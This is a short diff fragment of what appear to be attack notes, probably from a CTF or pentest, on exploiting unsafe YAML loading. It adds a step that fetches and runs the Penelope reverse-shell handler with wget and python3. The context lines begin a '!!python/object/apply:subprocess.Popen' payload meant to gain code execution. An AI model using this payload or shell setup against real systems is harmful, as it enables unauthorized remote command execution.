@@ -40,7 +40,12 @@ playlist:
       title: Maria Tambien      
  ```
     
-##shell      
+##shell  
+
+Use Penelope tool:
+```
+wget -q https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py && python3 penelope.py
+```
 ```      
 playlist:
   name: !!python/object/apply:subprocess.Popen
